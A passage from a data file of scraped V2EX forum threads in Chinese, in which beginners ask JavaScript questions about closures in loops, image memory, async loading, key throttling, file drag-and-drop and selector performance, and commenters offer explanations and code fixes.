但是有些糊涂， 后一次堆栈释放了， 变量i没有释放吗？ 那这样应该也会造成内存泄漏吧？ \r", "谢谢！", " \r", "刚刚测试发现内存占用确实会越来越大， gotcha!", "神奇的闭包原来是创建在堆上的， 难怪不会栈溢出！", "我的理解是 setTimeout 实际上把函数丢到下一次轮询的栈队列去了，i是值传递，如果是对象还有可能造成内存泄露", " 这和 for 循环操作差不多。\r", "\r", " 问题是 setTimeout 是即时返回一个 Timer ID 的啊，都没有递归。", " \r", "不对， 我试过了， 如果是对象， 也是一样的。 \r", "\r", " \r", "嗯，确实没有递归", " 可能会引用无法释放导致内存泄露，不会栈溢出"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人正在学JS，做一个标签切换效果，有个问题很久没搞不懂。</p>\n\n<p>mDD.length=2 请问这两段代码又什么不一样吗，测试效果不一样。</p>\n\n<p>代码1：</p>\n<div class=\"highlight\"><pre><span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"nx\">i</span><span class=\"o\">&lt;</span><span class=\"nx\">mDD</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span><span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">){</span>\n        <span class=\"nx\">mDD</span><span class=\"p\">[</span><span class=\"nx\">i</span><span class=\"p\">].</span><span class=\"nx\">addEventListener</span><span class=\"p\">(</span><span class=\"s1\">'mouseover'</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(){</span><span class=\"nx\">onMou</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">)});</span>\n<span class=\"p\">}</span>\n</pre></div>\n\n<p>代码2：</p>\n<div class=\"highlight\"><pre><span class=\"nx\">mDD</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">addEventListener</span><span class=\"p\">(</span><span class=\"s1\">'mouseover'</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(){</span><span class=\"nx\">onMou</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">)});</span>\n<span class=\"nx\">mDD</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"nx\">addEventListener</span><span class=\"p\">(</span><span class=\"s1\">'mouseover'</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(){</span><span class=\"nx\">onMou</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">)});</span>\n</pre></div>\n\n<p>代码1实现不了效果，换成代码2成功。</p>\n</div></div>"], "reply": "22", "tittle": "[Javascript] 请问这两段代码有什么不一样吗？", "comment": ["經典的閉包問題⋯Google \"JavaScript 閉包 事件綁定\"，有你要的答案", "1L正解", "循环后，i为2，楼上说对了，闭包问题", "经典问题…在闭包中你绑定的是变量而不是值。\r", "你需要在闭包外面再包一个闭包，然后把不变的量通过参数传过去。\r", "像这样：\r", "(function(j){ return function(){ onMou(j); }; })(i)", "1的结果其实是这样的：\r", "\r", " mDD[0].addEventListener('mouseover',function(){onMou(1)});\r", "\r", " mDD[1].addEventListener('mouseover',function(){onMou(1)});", " \r", "\r", "onMou(2)\r", "onMou(2)", "对数组遍历建议使用forEach", " js里明显应该用for i", "第一段代码里，i的作用域弄混了，for循环结束后i的值是个定值，无论哪个dom触发mouseover事件，后面函数里的i都是定值。", " 闭包  这个名称是怎么来的？", "这里讲的比较好 ", "for不产生作用域，所以绑定的两个函数中的i在中一个作用域中，因此最终的值是一样的。", "先unbound 下 再bound", "所以一般来说，代码1里面通常会这么写\r", "var j = i\r", "mDD[j].addEventListener('mouseover',function(){onMou(j)});", "v2ex帖子怎么实现代码着色的，我刚发的时候没有颜色的啊。", " 这样写一样的，`j`和`i`在同一层闭包里。", "```\r", "for (var i=0;i<mDD.length;i++){\r", "       (function(i){\r", "             mDD[i].addEventListener('mouseover',function(){onMou(i)});\r", "       })(i)\r", "        \r", "}\r", "\r", "```", "经典", " ", " 新建topic后,点击编辑,右下角多了个选项,文本标记语法,改为Markdown即可.", " closure，用来表达一种两个集合的包含关系", " 昨天被面试官考了这个问题，他给的标准答案就这个", " 谢谢！成功了，但还是无法理解\r", "\r", "(function(i){\r", "\t\tmDD[i].onmouseover=function(){onMou(i)};\r", "\t})(i);"]},
{"content": ["<div class=\"topic_content\">说是 CDN 其实不是真正的 CDN，只是把一些常用的 JS / CSS UI 库都扔里面，<br>包括 jQuery / zepto 等等。<br><br>之所以用又拍云是因为它支持 https ，我看 v2ex 经常有网友问一些 cdn 支不支持。<br><br>然后我想，难道我时不时的需要自己去看看 jQuery 更新了没？那还有好多库呢，咋整…？<br>有没有什么现成的同步方案，甚至可以生成 latest.js 随时调用最新版本。<br><br>希望有这方面经验的 V 友指点一下，谢谢~</div>"], "reply": "9", "tittle": "想自己弄个支持 https 的 cdn，文件存储在又拍云，有什么比较好的同步方案吗？", "comment": ["其实……upyun 有自己的公共资源CDN 啊。http://jscdn.upai.com", " 有几个我需要的这里都没有…\r", "不过我还是可以 @", " 来帮我删帖或结贴了，因为我刚刚发现 upyun 的 https 不支持自己绑定的域名", "同楼上，用公共的就好。latest.js生产当中用可能有问题，一旦js库某个function被deprecated了，页面很可能出现问题\r", "\r", "补充：\r", "\r", "\r", "https方法见\r", " 太赞了，谢谢老大", " 其实还有一些是自己做的库，公司几个项目要用到，不想每个项目都部署一下，遇到需要更新也方便同步，当然更新带来的负影响，我们也会最衡量，latest 当然是自己选择，同时版本号的地址", " 为何要绑定域名?\r", "看过那么多中大型网站用akamai, s3什么的都是用的默认域名", " 因为喜欢，因为有域名洁癖，因为对 upyun 带 b0 的三级域名太无语"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://www.shopify.com/technology/15646068-rebuilding-the-shopify-admin-improving-developer-productivity-by-deleting-28-000-lines-of-javascript\" rel=\"nofollow\">http://www.shopify.com/technology/15646068-rebuilding-the-shopify-admin-improving-developer-productivity-by-deleting-28-000-lines-of-javascript</a><br><br>被抛弃了!</div>"], "reply": "9", "tittle": "还记得当年那个 batmanjs 吗", "comment": ["现在基本也就剩下backbone, angular, ember这几家了", " react现在很红啊", "JavaScript最火的时候天天都有xxJS横空出世，现在不知道还剩下几个", "shopify 那种界面逻辑 也不是非得用个纯前端实现。", " 大浪淘沙嘛，backbone好在轻巧，angular适合开发大型应用，ember还没用过。", " javascript 已经不火了吗。。", "avalon也不错", " Node.JS", " 我指的“最火”是NodeJS刚出来那一两年，现在被Go还有其他新语言分掉一点，当然还是很火"]},
{"content": ["<div class=\"topic_content\">代码如下：<br>function SetscreenCanvas(data)<br>{<br>  var c=$(\"#screenCanvas\")[0];<br>  var cxt=c.getContext(\"2d\");<br>  var img=new Image();<br>  img.onload = function(){<br>      cxt.drawImage(img,0,0);<br>      img.remove();<br>      delete(img);<br>    };<br>  img.src='/data.png';<br>}<br>这个函数会多次执行，浏览器的内存一直增长不下，大家帮看看那不对呀。</div>"], "reply": "2", "tittle": "请教一个 img 动态创建，删除的问题", "comment": ["好多看不明白的", "$('#...')[0]这个取出来应该是啥？", "之后创建的Img是自己写的类么？", "动态加载img的话，可以试试在onload事件回调最后加一个img.onload=null", "本想是通过img加载图片后，把png图片画到canvas中，但多次执行 img.src赋值会发现img的图片资源一直不能释放。\r", "后来实验即使是只给img.src赋值图片路径，在多次赋值后浏览器也是会内存暴涨，没有找到办法。\r", "时间有点长了，最后放弃了，不确定img.src多次赋值内存不释放是不是个浏览器的bug。"]},
{"content": ["<div class=\"topic_content\">对 JS 开发了解不太多。不过最近一个 Android App 项目上用到了 PhoneGap 的 Cordova。<br>这个 JS 包是采用非阻塞式加载的，我的理解是响应 ondeviceready 事件就可以认为包已经加载完毕，可以调用硬件接口了。<br>可是，目前这个项目上要求使用一个内部开发的 JS 库。这个库是对 Cordova 的一个封装，并提供了一些和 App 交互的接口。<br>这时候问题来了，这个库也是异步加载，而且响应了 ondeviceready 事件，但没有转发出来。我该如何判断这个库什么时候加载完成？</div>"], "reply": "6", "tittle": "问个非阻塞加载 JS 的问题", "comment": ["自己在网上搜了一下，是不是可以用 RequireJS 来控制库的加载。这时候可以通过 callback 就知道库何时加载完成了？\r", "\r", "有没有更加简洁的方法，不需要引入第三方的库，最好是只需要几行代码就可以搞定的。", "setTimeout / setInteval", "sorry, setInterval", "promise", " @", " \r", "非常感谢，我来研究一下看看", "  它的库里面应该会有一些事件或者回调来确保加载完成的吧"]},
{"content": "", "reply": "11", "tittle": "Array.every()是阻塞的吗？", "comment": ["同步的，不阻塞，个人理解。\r", "\r", "alert这个才是阻塞的吧", "同步的……阻塞是说的IO，没IO哪来阻塞", " \r", " @", " @", " 对的，口误，就是想表达同步不同步的意思。", "当然是同步的了 JS下面还没有parallel循环的支持\r", "JS本身单线程 所以没有IO的部分都是同步执行的 就算用了setTimeout也是执行完了一个才可能开始下一个", "如果想做到异步而且是并行循环 那么得用worker来实现了", " alert好像不是阻塞的，会直接把后面的执行完", " alert是阻塞的", " 我也没测试过，就是感觉，那是我错了", "是", " 我就这个问题做了测试，将以下代码放置html文件跑起来便知\r", "\r", "<div id=\"test\" style=\"width: 50px;height: 50px;background:#000;position: absolute;left: 0; top: 0;\">\r", "\r", "</div>\r", "<script>\r", "var test = document.getElementById('test');\r", "setInterval(function(){\r", "    test.style.left = (parseInt(test.style.left) + 1) + 'px';\r", "\ttest.style.top = (parseInt(test.style.top) + 1) + 'px';\r", "}, 10);\r", "\r", "setTimeout(function(){\r", "\talert('stop');\r", "}, 1000);\r", "</script>"]},
{"content": ["<div class=\"topic_content\">//shortcut support. arrow-up arrow-down and enter event.<br>            if (event.which == keyMap.down || event.which == keyMap.up) {<br>                var direction = event.which == keyMap.down ? true : false,<br>                    $activeSelector = $('.wcSingleUser.active'),<br>                    $tmpSelector;<br><br>                //if current active selector has next or prev element and direction is matching<br>                //then execute switch active and keep unique<br>                if (((!!($tmpSelector = $activeSelector.next()) &amp;&amp; direction)<br>                    || (!!($tmpSelector = $activeSelector.prev()) &amp;&amp; !direction))<br>                    &amp;&amp; $tmpSelector.length) {<br>                    $activeSelector.removeClass('active');<br>                    $tmpSelector.addClass('active');<br>                }<br>                return;<br>            }<br><br><br>太美</div>"], "reply": "8", "tittle": "妈妈说好代码要分享-js", "comment": ["你想表达什么 ？", "函数名是个啥，变量声明不放在函数头么？", " 用的时候再声明变量是好习惯。", " js由于变量提升,其实在哪声明都跟在函数头声明是一样的，在函数头声明会安全些。用时重新初始化。", "js 新手，不要脸问一下……这段函数是干嘛用？亮点是？              我也想体会一下呀，教练！", "不明觉厉，简单两个判断可以完成的事，非要绕一大圈，这是逼格的体现？", " 对的", " 目测下来是一个快捷键的support"]},
{"content": ["<div class=\"topic_content\">* <a target=\"_blank\" href=\"http://ionicframework.com/\" rel=\"nofollow\">http://ionicframework.com/</a><br>* <a target=\"_blank\" href=\"https://github.com/breach/thrust/\" rel=\"nofollow\">https://github.com/breach/thrust/</a></div>"], "reply": "18", "tittle": "所有能用 js 写的软件都将会用 js 来写～", "comment": ["擦，\r", "PHP才是最好的语言", "第二个和 node-webkit 有什么不同", "除了支持其他语言外", "所有能用 PHP 写的软件都将会用 PHP 来写～", "我还会汇编呢……\r", "\r", "PHP是最好的语言！", "哈哈哈 看来 跟我看法的人不少啊。  PHP 确实方便。 win 下的不怎么稳定。", "python才是", "js确实好！", " \r", "不不，这是某种绕3个弯的吐槽罢了。PHP我从来没用过。", "后端用Node.JS，前端html/css/js，APP端Titanium，和PhoneGap，Mobile Sitehtml5/js，确实js通吃所有端了…………", "忘了是哪年的PyCon，有人演讲专门黑这个", "擦 html才是最好的语言", "中文才是最好的语言……", "一看到PHP我就滚进来顶PHP了.", "PHP⬆️:rocket:", "最近RAM是不是又降价了？\r", "\r", "原生大法好。", "ASP才是。。。", "Basic 天下无敌！！"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://www.chanel.com/en_US/fashion.html\" rel=\"nofollow\">http://www.chanel.com/en_US/fashion.html</a><br><br>1. 有没有什么相关术语？（我好去google了解）<br>2. 有没有开源实现？<br>3. 这种效果的原理是什么？<br><br>谢谢！</div>"], "reply": "17", "tittle": "请问这种效果是怎么实现的？", "comment": ["我猜是根据鼠标相对于浏览器窗口的位置，来调整后面背景的位置。", "有点像，处于放大镜模式", "基本上是 ", " 的变种", "以鼠标为焦点的视差？", "CSS做的吧。", "你们打开lz能url后，cpu不会100%吗？我风扇立马像飞机起飞的声音，呜呜呜呜～～", "你们觉得这种交互好吗？不顾鼠标的操作习惯，这样算是拟物（模拟眼睛）的操作方法吗？把鼠标操作变成眼睛的视角。如果只是用在背景的话还不错，用在整个页面的内容上我就接受不了。每次鼠标移出浏览器边缘都很难受。", "另外，实现的话应该是算 mousemove之后的点与中心点 X、Y轴的差，然后用 css3 动画来偏移整个最外层的 div。", "里面的视频音乐挺棒的", "这个跟iOS的scrollview差不多，修改content wrapper的位置应该就可以了。", " 我也觉得不舒服", "基本审查下网页就知道怎么实现的了，根据鼠标位置用translate3d 调整背景位置", "1. 结构层：\r", "div#wrapper\r", "   div#contentBox\r", "\r", "wrapper的宽高和浏览器窗口完全相同\r", "contentBox是宽高是真实内容层的大小\r", "\r", "2. 行为层：\r", "监听mousemove事件，根据鼠标的座标来实时改变contentBox层的x和y轴的偏移值\r", "\r", "3. 样式层：\r", "建议使用css3的translate3d()方法来改变contentBox层的偏移值\r", "对contentBox设置css3的transition，可以设置各种缓动效果（ease-in，ease-out等），让contengBox的移动有缓冲的过渡效果", " \r", "如果能找到一个适用的场合，效果还是挺赞的。这个网页上，确实看不出有什么需要这种技术的地方", "丑到不能忍...", " 是的，问题就在于把平时浏览整个网站的操作习惯硬生生套用在这个效果上了。导致鼠标操作让人感觉很别扭不舒服。鼠标君表示压力太大了，明明平时想往哪甩就往哪甩，最多滚一滚轮。。\r", "\r", "简单点说就是不习惯了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>姑且使用这个标题来描述这个问题。</p>\n\n<p>情况就是我的一个网站用 Twitter 那种居中显示图片一部分的方法来显示图片，我的原理就是前端载入图片时给 $('img') 定义 CSS</p>\n\n<p>但是不是每次又都有效果，最后发现可能是因为图片的缓存原因，</p>\n\n<p>我尝试的解决方法是</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">el</span> <span class=\"o\">=</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'img'</span><span class=\"p\">);</span>\n    <span class=\"nx\">el</span><span class=\"p\">.</span><span class=\"nx\">one</span><span class=\"p\">(</span><span class=\"s2\">\"load\"</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n       <span class=\"cm\">/*do something, for me I wanna make the image center visible, so I make these moves, the parent of img element is overflow:hidden  =&gt; </span>\n<span class=\"cm\">        var marginTop = 0;</span>\n<span class=\"cm\">        if($(this).height()&gt;253){</span>\n<span class=\"cm\">            marginTop = ($(this).height()-253) /2;</span>\n<span class=\"cm\">            marginTop = '-'+marginTop+'px';</span>\n<span class=\"cm\">        }</span>\n\n<span class=\"cm\">        $(this).css('margin-top',marginTop);</span>\n<span class=\"cm\">        */</span>\n    <span class=\"p\">}).</span><span class=\"nx\">each</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n      <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">complete</span><span class=\"p\">)</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">).</span><span class=\"nx\">load</span><span class=\"p\">();</span>\n    <span class=\"p\">});</span>\n</pre></div>\n\n<p>以前的实现方式:</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">el</span> <span class=\"o\">=</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'img'</span><span class=\"p\">);</span>\n<span class=\"nx\">el</span><span class=\"p\">.</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s1\">'load'</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(){</span>\n        <span class=\"c1\">//do something</span>\n    <span class=\"p\">})</span>\n</pre></div>\n\n<p>似乎能解决问题，求高手正解 …</p>\n</div></div>"], "reply": "3", "tittle": "图片由于缓存所以不会每次使用 .load() 都会有效果 ", "comment": ["目测是你绑定的时机不对，在图片加载后才绑的。", "绑定load事件再attr src属性。\r", "图片缓存问题的话可以在src中加个随机字符串来解决。", "我眼花啦？\r", "LZ帖子后面跟了个doge头像？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>JS:<br>\n<code><br>\nvar h5 = {<br>\n    cache : {},<br>\n    init : function(){<br>\n        cache.$file = document.getElementById('file');<br>\n        cache.$file.addEventListener('drop', this.drop_handle, false);<br>\n    },<br>\n    drop_handle : function(e){<br>\n        e.stopPropagation();<br>\n        e.preventDefault(); <br>\n        var files = e.target.files || e.dataTransfer.files;<br>\n        console.info(files);<br>\n        return false;<br>\n    }<br>\n}<br>\nh5.init();<br>\n</code><br>\nHTML:<br>\n<code><br>\n&lt;input type=\"file\" name=\"\" id=\"file\" style=\"font-size:5em\"&gt;<br>\n</code><br>\n在 ff 或 chrome 中，把文件拖放进去到 file 按钮，console.log 出来的是空文件信息，这段代码有哪里有错吗？怎么看也没有错吧……</p>\n</div></div>"], "reply": "4", "tittle": "为啥这段代码获取不到 files 信息呢？", "comment": ["<input type=\"file\" name=\"\" id=\"file\" style=\"font-size:5em\" draggable=\"true\">\r", "\r", "this.cache.$file = document.getElementById('file');\r", "this.cache.$file.addEventListener('drop', this.drop_handle, false);", "\r", "\r", "参考这个，绑定个事件什么元素都可以了", "var files = (e.target.files.length && e.target.files) || e.dataTransfer.files;", " var files = (e.target.files.length && e.target.files) || e.dataTransfer.files;\r", "\r", "谢谢回复，不过奇怪啊，ff 里面获取的 e.target.files.length 居然是 0，但console出来的明明是显示1。而且 ff 的 e 里面没有 dataTransfer 属性，得加一个 originalEvent.dataTransfer，真奇葩。。。\r", "\r", "\r", " 参考这个，绑定个事件什么元素都可以了\r", "\r", "3Q，已参考 originalEvent.dataTransfer 这个属性……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我想写一个小游戏<br>\n网页上监听按键：<br>\n<code>window.addEventListener( \"keypress\", doKeyPress, false )</code></p>\n\n<p>doKeyPress 函数大致就是移动网页上的元素，<br>\n但我想给这个移动加一点限速，<br>\n怎样在得到一个按键事件后就丢弃一定时间内的按键事件呢？</p>\n\n<p>或者别的实现方法啊，</p>\n<div class=\"highlight\"><pre><span class=\"kd\">function</span> <span class=\"nx\">keyPress</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"sadfsdf\"</span><span class=\"p\">)</span>\n  <span class=\"nx\">key</span> <span class=\"o\">=</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">keyCode</span> <span class=\"o\">||</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">which</span>\n  <span class=\"nx\">keychar</span> <span class=\"o\">=</span> <span class=\"nb\">String</span><span class=\"p\">.</span><span class=\"nx\">fromCharCode</span><span class=\"p\">(</span><span class=\"nx\">key</span><span class=\"p\">);</span>\n  <span class=\"k\">switch</span> <span class=\"p\">(</span><span class=\"nx\">key</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"c1\">//...</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</pre></div>\n<div class=\"highlight\"><pre><span class=\"kd\">function</span> <span class=\"nx\">doKeyPress</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">){</span>\n  <span class=\"k\">return</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"nx\">keyPress</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</pre></div>\n</div></div>", "<div class=\"topic_content\"> [解决方法] <br>按键事件本身也有 时间戳 ，可以存一个变量，然后每次和 e.timeStamp 比较，<br>差不多就这样吧</div>"], "reply": "7", "tittle": "求助 js 问题", "comment": ["undersocre的debounce方法会给你思路", "你可以这样试试\r", "\r", "var a = null;\r", "\r", "function doKeyPress(e){\r", "\tif(!a){\r", "\t\ta= setTimeout(function(){\r", "\t\t\tclearTimeout(a);\r", "\t\t\ta= null;\r", "\t\t},200);\r", "\t\t/*do press event*/\r", "\t}\r", "}", "怎样在得到一个按键事件后就丢弃一定时间内的按键事件呢？", "怎样在得到一个按键事件后就丢弃一定时间内的按键事件呢？\r", "不好意思，刚点错快捷键直接发出去了。。\r", "可以在按键后，存一个时间戳，之后的按键，都和这个时间戳对比一下间隔，小于你设定阙值的就啥都不干。。判断通过就刷新一下时间戳", " 的思路是让用户的操作滞后特定时间执行\r", "\r", " 的思路是特定时间内只执行一次 （个人更倾向这种思路）\r", "\r", "\r", " 的建议不错，去看_的实现。 话说你的头像真是：好坏的！！！", " 嗯。然后在这个滞后时间内的所有操作都忽略。", " @", " \r", "对哒，我仔细看了之后发现 kepress 事件本身也有一个时间戳的。。 \r", "可以用 e.timeStamp ,然后再存一个变量，每次比较一下"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>各位好， 分享一个上海的JavaScript线下聚会</p>\n\n<ul>\n<li>报名地址: <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.meetup.com/Shanghai-JavaScript-Meetup/events/201810022/\">http://www.meetup.com/Shanghai-JavaScript-Meetup/events/201810022/</a></li>\n<li>活动时间：12月12日周五下午7点</li>\n<li>活动地点：静安区愚园东路28号东海广场3号楼一楼生意专家[2/7号线静安寺地铁站]</li>\n<li>活动形式：除去已经确定要分享的嘉宾，参加活动的任何人都可以随时上去分享自己最近折腾的小项目，学习的新框架，遇到新的变成问题等，话题以JavaScript为主但不限于此 :D</li>\n<li><p>嘉宾分享：</p>\n\n<ul>\n<li>Michał Koźmiński from Poland, he will give one or more presentations from the following topics:\n• Asm.js - native apps on web \n• Marionette.js - modular app architecture with require.js\n• Grunt/Gulp - detaching from rails sprockets<br></li>\n<li>Garry Yao from EF labs, also the organizer of JS.WED, will have a talk on the hottest JavaScript view library: Introducing React - A new approach to front end engineering </li>\n<li>Teddy Hoo will share the something cool about socket.io.</li>\n</ul></li>\n</ul>\n\n<p>除了以上精彩内容，此次活动还专门为大家准备了免费的小吃和饮料， 所以大家下班后直接过来这边吃就可以了。 另外还有我们活动为主体的贴纸和T-shrit,欢迎过来拿！</p>\n\n<p><img src=\"http://photos4.meetupstatic.com/photos/event/2/3/0/f/600_431888975.jpeg\" alt=\"sticker\"></p>\n</div></div>"], "reply": "2", "tittle": "[Shanghai JavaScript Meetup]上海 JavaScript 线下聚会", "comment": ["帮赞。", " 多谢！"]},
{"content": ["<div class=\"topic_content\">#求助 <br><br>我是小白，对javascript一无所知......<br>在模板文件中添加如下代码（&lt;/body&gt;之前）<br>  &lt;script type=\"text/javascript\"&gt;<br>  (function() {<br>    var po = document.createElement('script');<br>    po.type = 'text/javascript'; po.async = true;<br>    po.src = '<a target=\"_blank\" href=\"https://apis.google.com/js/client:plusone.js\" rel=\"nofollow\">https://apis.google.com/js/client:plusone.js?</a> onload=render';<br>    var s = document.getElementsByTagName('script')[0];<br>    s.parentNode.insertBefore(po, s);<br>  })();<br><br>  function render() {<br>    gapi.signin.render('customBtn', {<br>      //'callback': 'signinCallback',<br>      'clientid': '<a target=\"_blank\" href=\"http://876129027227-m4n8ghl8s6g8slbs2c48eh6o4fbdn4ff.apps.googleusercontent.com\" rel=\"nofollow\">http://876129027227-m4n8ghl8s6g8slbs2c48eh6o4fbdn4ff.apps.googleusercontent.com</a>',<br>      'cookiepolicy': 'single_host_origin',<br>      'requestvisibleactions': '<a target=\"_blank\" href=\"http://schemas.google.com/AddActivity\" rel=\"nofollow\">http://schemas.google.com/AddActivity</a>',<br>      'scope': '<a target=\"_blank\" href=\"https://www.googleapis.com/auth/plus.login\" rel=\"nofollow\">https://www.googleapis.com/auth/plus.login</a>'<br>    });<br>  }<br>  &lt;/script&gt;<br>  &lt;style type=\"text/css\"&gt;<br>     #customBtn  {<br>      display: inline-block;<br>      background:  #cc3732 ;<br>      color: white;<br>      width: 175px;<br>      border-radius: 5px;<br>    }<br>     #customBtn :hover {<br>      background:  #e74b37 ;<br>      cursor: hand;<br>    }<br>    span.label {<br>      font-weight: bold;<br>    }<br>    span.icon {<br>      background: url('/+/images/branding/btn_red_32.png') transparent 10px 50% no-repeat;<br>      display: inline-block;<br>      vertical-align: middle;<br>      width: 40px;<br>      height: 40px;<br>    }<br>    span.buttonText {<br>      display: inline-block;<br>      vertical-align: middle;<br>      padding-left: 40px;<br>      padding-right: 40px;<br>    }<br>  &lt;/style&gt;<br>  &lt;span class=\"label\"&gt;Sign in with:&lt;/span&gt;<br>  &lt;div id=\"customBtn\" class=\"customGPlusSignIn\"&gt;<br>    &lt;span class=\"icon\"&gt;&lt;/span&gt;<br>    &lt;span class=\"buttonText\"&gt;Google&lt;/span&gt;<br>  &lt;/div&gt;<br><br>这是添加Google登录按钮的。<br><br>想问一下，这个回调函数具体怎么编写呢？我没有接触过JavaScript，不懂怎么编写……<br>例如我想实现这样的效果：<br>用户授权，返回True，则跳转到注册页面，注册一个帐号，以后用户登录Google帐号就可以访问论坛（也就是绑定了Google帐号）<br>用户不授权，返回False，不过由于论坛只有注册才可以进入，按钮的页面正是登录界面，因此不用做任何反应。<br><br>这改怎么编写呢？</div>"], "reply": "2", "tittle": "问一个 Google+ Login API 的回调函数问题。", "comment": ["不好意思打了几个错别字", "就是 ", " ……网页底部的一个按钮"]},
{"content": ["<div class=\"topic_content\">比如有个删除按钮：<br>&lt;div class='btn btn-danger btn-delete'&gt;&lt;/div&gt;<br><br>其中btn-delete是给jQuery做选择器用的<br>$('.btn-delete').click (...)<br><br>因为class中btn btn-danger是和UI相关的，而btn-delete是和事件处理相关的，<br>所以我想把名字改成<br>&lt;div class='btn btn-danger trigger-delete'&gt;&lt;/div&gt;<br><br>此时JS代码为<br>$('.trigger-delete').click (...)<br><br>这样从名字就能一目了然看出，那些是和CSS相关，那些是和JS相关。<br><br>我的问题是，如果我把trigger-delete移到attribute里面，改成这样<br>&lt;div class='btn btn-danger' data-trigger='delete'&gt;&lt;/div&gt;<br><br>此时JS代码为<br>$('[data-trigger=\"delete\"]').click (...)<br><br>这样class只和CSS有关。<br><br>这种做法可行吗？会有效率或者别的问题？前端小白弱问。</div>"], "reply": "21", "tittle": "把 HTML 中作为 trigger 的 class name 放到 attribute 里面，会影响效率吗？", "comment": ["可行的，只是选择器执行起来效率差点。", "肯定没有用class快，lz可以考虑用类似J_Delete或T_Delete的类名与css中用的class名区分开", "带来可维护性和可读性的提高相较于导致性能的损失几乎可以忽略.", "最近在思考这个问题：如何用合理的 attr 替代冗长的 class。暂时还没有什么结果出来，有结果再跟你分享一下。", " \r", " \r", " \r", "有没有推荐的文章解释选择器执行效率的？\r", "\r", "\r", " \r", "好", "这样html代码是变美了，可js代码变丑了：\r", "\r", "$('[data-trigger=\"delete\"]')", " \r", "\r", "css的选择器效率分析： ", "\r", "关于CSS选择器的效率问题： ", "\r", "Efficiently Rendering CSS： ", "跟@", " 的观点一致，这点性能差别可以忽略，代码的可维护性更有价值。", " Look ", " 这个问题主要是js的选择器性能而不是css吧\r", "\r", "建议：\r", "css中用class，js的唯一元素挂id，其他的元素选择综合考虑。\r", "attr和class在现代浏览器中js选择性能差别很小的。", "选个class就不用jq吧，直接 selectQuery。", " 我认为 JS 选择元素的效率和 CSS 中“一样”，当然不一定是 1:1，但在忽略 JS 和 CSS 执行差异之后，两者执行两个选择器的速度比例应该几乎一样。（浏览器实现的问题，这个不是楼主要关心的重点）\r", "\r", "\r", "我同样赞同 @", " 的观点，程序的可读性和可维护性大大提高，一点选择器效率的降低无关紧要。\r", "\r", "我昨天写了这个 demo ", " ，来尝试找出用 class 和 attr 带来的差异。目前的结果是：自定义的 attr 是非标准的，无法验证，但能够被广泛支持。", "class=\"btn action\" data-trigger=\"delete\"", "$('.action[data-trigger=\"delete\"]')", "这样会更快", "在 H5 规范里，推荐的是扩展 class 或者 data-* 属性 ", " \r", "\r", "在 Angular.js 里，使用 ng-* 或者其他任意的属性名来扩展。\r", "\r", "这个 data-* 适合 JS 中存储数据用，而 class 适合为元素扩展样式用。如果想要参考 disabled 这类属性扩展一个 hide(=true/false) 属性，class 和 attr 都可以。\r", "\r", "attr 方式好在简洁易懂，但 data-hide 属性就不如 hide 属性易读。\r", "\r", "我会继续研究这个问题。", "不要在意这些细节，真的~", " 这位同学给出的文档，是CSS选择器速度文档，关乎于浏览器渲染页面时的性能，但并非jquery的attribute selector与class selector之间的速度对比。\r", "\r", "上面这个地址，歪果仁做了个测试，是关于两种选择器的速度对比的（googleapis这个域名需要翻一下）。\r", "可以得出，虽然慢了一点，但完全是可以接受的。\r", "相对于使用data-*带来的可维护性和可读性的收益，那点性能损耗可以忽略。", "楼主可以看看Rails是怎么做的", "补个链接 ", "感谢大家的回复。\r", "\r", " \r", " \r", " \r", "同意你们的观点，“可维护性和可读性的收益”大于“性能损耗”\r", "\r", " \r", "确实有点过于细节了。这个问题反复出现，困扰我好久了。。。前几次都忽略，这次终于受不了了\r", 